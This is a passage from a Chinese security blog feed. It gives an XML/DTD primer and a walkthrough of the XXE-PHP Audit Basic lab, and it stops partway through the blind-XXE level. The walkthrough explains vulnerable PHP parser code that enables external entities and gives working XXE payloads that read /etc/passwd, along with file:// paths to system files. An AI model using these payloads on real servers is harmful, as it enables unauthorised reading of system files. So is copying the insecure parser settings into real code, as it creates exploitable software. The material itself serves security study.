size="4">注意：</font></p><ul><li><p>元素标记区分大小写</p><p><code>&lt;Name&gt; ≠&lt;name&gt;;</code></p></li></ul><p>XML元素标记命名规则:</p><ul><li>可以包含字母，数字及其它字符,不能以数字、下划线等标点符号开头;</li><li>不能包含空格</li><li>不能以字母 xml（或者 XML、Xml 等等）开始</li></ul><hr><p>xml有且只有一个根元素，根元素的起始标记要放在所有其它元素起始标记之前，根元素的结束标记根放在其它所有元素的结束标记之后。</p><h1 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h1><h2 id="XML属性"><a href="#XML属性" class="headerlink" title="XML属性"></a>XML属性</h2><p>属性值必须加引号</p><h2 id="XML注释"><a href="#XML注释" class="headerlink" title="XML注释"></a>XML注释</h2><p>与HTML一致：<code>&lt;!--This is comment --&gt;</code></p><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><h3 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h3><p>由于XML中部分符号具有特殊意义，为避免解析器解析错误，以实体引用代替部分字符；</p><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th><code>&amp;lt;</code></th><th>&lt;</th></tr></thead><tbody><tr><td><code>&amp;gt;</code></td><td>&gt;</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td></tr><tr><td><code>&amp;apos;</code></td><td>‘</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td></tr><tr><td>—</td><td></td></tr></tbody></table><h3 id="命名实体"><a href="#命名实体" class="headerlink" title="命名实体"></a>命名实体</h3><hr><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"  encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[ </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT A   "i"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT B   "am"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT C   "hacker"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">A</span>&gt;</span>&amp;A;<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">B</span>&gt;</span>&amp;B;<span class="tag">&lt;/<span class="name">B</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">C</span>&gt;</span>&amp;C;<span class="tag">&lt;/<span class="name">C</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p><strong>combine.dtd</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY content &quot;%parameterA;%parameterB;%parameterC;&quot;&gt;</span><br></pre></td></tr></table></figure><hr><p><strong>xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"  encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[ </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT % parameterA "i"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT % parameterB "am"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT % parameterC "hacker"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY dtd SYSTEM "combine.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;content<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引用格式：</p><table><thead><tr><th>参数实体</th><th>%parameter_name</th></tr></thead><tbody><tr><td>其他实体</td><td>&amp;name</td></tr></tbody></table><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"  encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY outfile SYSTEM "outfile.xml"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">outfile</span>&gt;</span>&amp;outfile<span class="tag">&lt;/<span class="name">outfile</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XXE漏洞一般发生在应用程序解析XML输入时，没有处理好外部实体的加载；</p><p>+++</p><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><ul><li><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p></li><li><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p></li></ul><p>1.内部的DOCTYPE声明<br>  <code>&lt;!DOCTYPE root-element [element-declarations]&gt;</code>即<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[                           &lt;!--定义此文档为note类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT heading   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body   (#PCDATA)&gt;           &lt;!--定义元素的类型为#PCDATA--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>I miss you !<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.外部文档声明</p><p><code>&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code>即<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code><br>  或<br><code>&lt;!DOCTYPE root-element  PUBLIC &quot;public_ID&quot; &quot;filename&quot;&gt;</code> 即<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;文件源&quot; &quot;文件名&quot;&gt;</code></p><h2 id="声明元素"><a href="#声明元素" class="headerlink" title="声明元素"></a>声明元素</h2><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：<br><code>&lt;!ELEMENT element-name category&gt;或</code><!ELEMENT element-name (element-content)> </p><hr><h1 id="XXE原理"><a href="#XXE原理" class="headerlink" title="XXE原理"></a>XXE原理</h1><p>XXE即XML外部实体注入。<br>简单解释可看成两个部分：</p><ul><li>注入<br>XML数据在传输过程中被恶意修改，导致服务器执行了修改后的恶意代码，从而达到攻击目的；</li><li>外部实体<br>为达到注入（修改）XML数据的目的，攻击者通过外部实体声明声明部分对XML数据进行修改，完成恶意注入；</li></ul><p>** XXE漏洞是由xml解析器配置不安全，解析器本身并不分析实体是否为恶意内容，仅检查xml文件是否有结构上的错误。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。**</p><p>关于：[XXE-PHP Audit Basic](<a href="https://singlemindedt.github.io/2020/02/29/XXE-PHP">https://singlemindedt.github.io/2020/02/29/XXE-PHP</a> Audit Basic/)</p><p>++++</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2020/03/02/3fZsUK.jpg&quot; alt=&quot;3fZsUK.jpg&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;XML简介&quot;&gt;&lt;a href=&quot;#XML简介&quot; class=&quot;headerlink&quot; title=&quot;XML简
      
    
    </summary>
    
    
      <category term="XML" scheme="https://singlemindedt.github.io/tags/XML/"/>
    
      <category term="DTD" scheme="https://singlemindedt.github.io/tags/DTD/"/>
    
  </entry>
  
  <entry>
    <title>XXE-PHP Audit Basic</title>
    <link href="https://singlemindedt.github.io/2020/02/29/XXE-PHP%20Audit%20Basic/"/>
    <id>https://singlemindedt.github.io/2020/02/29/XXE-PHP Audit Basic/</id>
    <published>2020-02-29T10:20:08.000Z</published>
    <updated>2020-03-02T13:25:17.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建XXE-PHP-Audit-Basic-环境"><a href="#搭建XXE-PHP-Audit-Basic-环境" class="headerlink" title="搭建XXE-PHP Audit Basic 环境"></a>搭建XXE-PHP Audit Basic 环境</h1><p><a href="https://github.com/vulnspy/phpaudit-XXE" target="_blank" rel="noopener">XXE-PHP Audit Basic</a><br>1.</p><ul><li>GitHub项目页Vulnspy提供了在线运行环境，单击<code>Vsplate GO&gt;</code>按钮可以创建在线环境，直接在上面操作即可；</li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36SUD1.png" alt="36SUD1.png"><br>+++<br>2.</p><ul><li>将XXE-PHP Audit Basic文件下载下来解压至Phpstudy2018\PHPTutorial\WWW目录下；</li></ul><ul><li><p>开启Phpstudy2018的Apache和MySql服务;</p></li><li><p>访问<a href="http://127.0.0.1/phpaudit-XXE-master/" target="_blank" rel="noopener">http://127.0.0.1/phpaudit-XXE-master/</a> 即可；</p></li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36SNuR.png" alt="36SNuR.png"></p><p><font color="#ff000" face="黑体" size="4">XXE漏洞(XML External Entity,XML外部实体注入攻击)：如果可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项，攻击者就能够攻击含有缺陷的XML处理器。</font></p><p>关于<a href="https://singlemindedt.github.io/2020/03/01/2020-03-1-XML/">XML</a>,相关<a href="https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP-DOMDocument/">题目</a> :smile:</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;搭建XXE-PHP-Audit-Basic-环境&quot;&gt;&lt;a href=&quot;#搭建XXE-PHP-Audit-Basic-环境&quot; class=&quot;headerlink&quot; title=&quot;搭建XXE-PHP Audit Basic 环境&quot;&gt;&lt;/a&gt;搭建XXE-PHP Audi
      
    
    </summary>
    
    
      <category term="XXE" scheme="https://singlemindedt.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>XXE-PHP Audit Basic详解</title>
    <link href="https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP%20Audit%20Basic%E8%AF%A6%E8%A7%A3/"/>
    <id>https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP Audit Basic详解/</id>
    <published>2020-02-29T10:20:08.000Z</published>
    <updated>2020-05-15T00:25:39.566Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]<br>[5]:()</p><p><img src="https://s1.ax1x.com/2020/04/27/JfuUZn.png" alt="JfuUZn.png"></p><h2 id="1-DOMDocument-php"><a href="#1-DOMDocument-php" class="headerlink" title="1.DOMDocument.php"></a>1.DOMDocument.php</h2><p>点开链接，有如下xml代码：</p><p><img src="https://s1.ax1x.com/2020/04/27/Jfuaaq.png" alt="Jfuaaq.png"></p><p>简单的定义了一个外部实体<strong>content</strong>，通过<strong>file</strong>协议来读取服务器端本机的文件（此处读取的文件为etc/passwd）；</p><p>PHP中可以通过FILE协议、HTTP协议和FTP协议读取文件；xml文件使用PHP解析，故还可利用PHP伪协议;</p><p>在使用file://协议时，有以下几种格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file：//host/path</span><br><span class="line">* Linux</span><br><span class="line"> file:///etc/passwd</span><br><span class="line">*  Unix</span><br><span class="line"> file://localhost/etc/fstab</span><br><span class="line"> file:///localhost/etc/fstab</span><br><span class="line">*  Windows</span><br><span class="line"> file:///c:/windows/win.ini</span><br><span class="line"> file://localhost/c:/windows/win.ini</span><br><span class="line">* （下面这两种在某些浏览器里是支持的）</span><br><span class="line"> file:///c|windows/win.ini</span><br><span class="line"> file://localhost/c|windows/win.ini</span><br></pre></td></tr></table></figure><p>XML在各语言下支持的协议有:</p><p><img src="https://s1.ax1x.com/2020/04/27/JfuDRU.png" alt="JfuDRU.png"></p><p>查看源文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'s'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($dom);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($resp);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>isset($_POST[&#39;data&#39;])</code>检查<code>$_POST[&#39;data&#39;]</code>是否存在，存在返回true，不存在返回false；</p></li><li><p><code>$_POST[&#39;data&#39;]</code>获得POST传值；</p></li></ul><p>+++</p><h3 id="源码解释"><a href="#源码解释" class="headerlink" title="源码解释:"></a>源码解释:</h3><p>+++</p><ol><li><code>libxml_disable_entity_loader(false);</code>#禁用加载外部实体的功能</li></ol><p>参数：</p><p>禁用（<strong><code>TRUE</code></strong>）或启用（<strong><code>FALSE</code></strong>）libxml扩展（例如 DOM,XMLWriter和XMLReader）以加载外部实体。<br>+++</p><ol start="2"><li><p><code>$data = isset($_POST[&#39;data&#39;])?trim($_POST[&#39;data&#39;]):&#39;&#39;;</code></p><p>#<code>isset($_POST[&#39;data&#39;])</code>若存在（不为空），则返回去除空格后的<code>$_POST[&#39;data&#39;]</code>；否则返回空值。并将结果赋值给<code>$data</code><br>语法</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="keyword">isset</span> ( mixed $<span class="keyword">var</span> [, mixed $... ] )</span><br></pre></td></tr></table></figure></li></ol><p>检测变量是否设置，并且不是 NULL。<br>如果已经使用 unset() 释放了一个变量之后，它将不再是 isset()。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。同时要注意的是一个 NULL 字节（”\0”）并不等同于 PHP 的 NULL 常数。<br>| 参数  | 描述           |<br>| :—- | :————- |<br>| <em>var</em> | 要检查的变量。 |<br>细节：<br>返回值：如果 <code>var</code> 存在并且值不是 <code>NULL</code> 则返回 <code>TRUE</code>，否则返回 <code>FALSE</code>。</p><p>+++</p><ol start="3"><li><p><code>$dom = new DOMDocument();</code></p><p>#实例化一个DomDocument对象；</p></li></ol><p>+++</p><ol start="4"><li><p>loadXML() 方法通过解析一个 XML 标签字符串来组成该文档。<br> 语法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">loadXML</span><span class="params">(text)</span></span></span><br></pre></td></tr></table></figure></li></ol><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">text</td><td align="left">要解析的 XML 标签。</td></tr><tr><td align="left">+++</td><td align="left"></td></tr><tr><td align="left">5. <code>LIBXML_NOENT</code>: 将 XML 中的实体引用 替换 成对应的值</td><td align="left"></td></tr></tbody></table><p><code>LIBXML_DTDLOAD</code>: 加载 DOCTYPE 中的 DTD 文件</p><p>+++</p><ol start="6"><li><code>ob_start</code>：打开输出缓冲区<br>函数格式：<code>void ob_start(void)</code><br>说明：当缓冲区激活时，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区。为了输出缓冲区的内容，可以使用<code>ob_end_flush()</code>或<code>flush()</code>输出缓冲区的内容。</li></ol><p><code>ob_get_contents</code> ：返回内部缓冲区的内容。<br>使用方法：<code>string ob_get_contents(void)</code><br>说明：这个函数会返回当前缓冲区中的内容，如果输出缓冲区没有激活，则返回 FALSE 。</p><p><code>ob_end_clean</code>：删除内部缓冲区的内容，并且关闭内部缓冲区<br>使用方法：<code>void ob_end_clean(void)</code><br>说明：这个函数不会输出内部缓冲区的内容而是把它删除！</p><p>+++</p><ol start="7"><li><strong>var_dump()</strong> 函数用于输出变量的相关信息。</li></ol><p><strong>var_dump()</strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>+++</p><ol start="8"><li><code>htmlspecialchars()</code> 函数把特殊字符转换为 HTML 实体。这意味着 &lt; 、&gt; 之类的 HTML 字符会被替换为 <code>&amp;lt;</code> 和 <code>&amp;gt;</code>。这样可防止攻击者通过在表单中注入 HTML 或 JavaScript 代码（跨站点脚本攻击）对代码进行利用。</li></ol><p>+++</p><p><strong>概括一下就是，由于该代码未禁用加载外部实体，当我们传入恶意XML文件后，服务器直接对post数据进行xml解析，并加载外部实体，使之读入我们想要得到内容到缓冲区，输出变量相关性息后，将缓冲区内容赋值给其他变量，最终回显变量内容。</strong></p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到目标内容：</p><p><img src="https://s1.ax1x.com/2020/04/27/JfudI0.png" alt="JfudI0.png"></p><h2 id="2-SimpleXMLElement-php"><a href="#2-SimpleXMLElement-php" class="headerlink" title="2.SimpleXMLElement.php"></a>2.SimpleXMLElement.php</h2><p>打开链接，页面样式与DOMDocument.php无二，直接来查看源码；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'s'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $xml = <span class="keyword">new</span> SimpleXMLElement($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($xml);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($resp);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码只与DOMDocument.php中新建对象不同；</p><p>（SimpleXML 函数是 PHP 核心的组成部分。无需安装即可使用这些函数。</p><p>DOMDocument 同样也是，DOM XML 解析器函数是 PHP 核心的组成部分。无需安装就可以使用这些函数。</p><p>SimpleXML操作xml相对DOMDocument要简单许多，但函数功能较少，适合实现较简单的功能，详情可参见SimpleXML的函数文档，DOMDocument则提供了全面的操作xml函数和属性，适合实现复杂的xml操作。）</p><h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>返回目标结果：</p><p><img src="https://s1.ax1x.com/2020/04/27/Jfu0iV.png" alt="Jfu0iV.png"></p><p>+++</p><h2 id="3-simplexml-load-string-php"><a href="#3-simplexml-load-string-php" class="headerlink" title="3.simplexml_load_string.php"></a>3.simplexml_load_string.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'s'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $xml = simplexml_load_string($data, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($xml);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($resp);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>simplexml_load_string</code>;#从 XML 字符串获取 SimpleXMLElement 对象（转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素）</p><p>语法<br><code>simplexml_load_string(*data,classname,options,ns,is_prefix*);</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>data</em></td><td align="left">必需。规定形式良好的 XML 字符串。</td></tr><tr><td align="left"><em>classname</em></td><td align="left">可选。规定新对象的 class。</td></tr><tr><td align="left"><em>options</em></td><td align="left">可选。规定附加的 Libxml 参数。通过指定选项为 1 或 0（TRUE 或 FALSE，例如 LIBXML_NOBLANKS(1)）进行设置。</td></tr></tbody></table><p>+++</p><p>源码与之前关卡没有太大不同，仅改变获取实体的方法。<code>libxml_disable_entity_loader(false);</code>处，未禁止加载外部实体；同时<code>simplexml_load_string</code>允许我们通过DTD来定义外部实体。</p><h3 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到目标内容：</p><p><img src="https://s1.ax1x.com/2020/04/27/Jfutqs.png" alt="Jfutqs.png"></p><h2 id="4-BlindXXE-php"><a href="#4-BlindXXE-php" class="headerlink" title="4.BlindXXE.php"></a>4.BlindXXE.php</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'s'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span 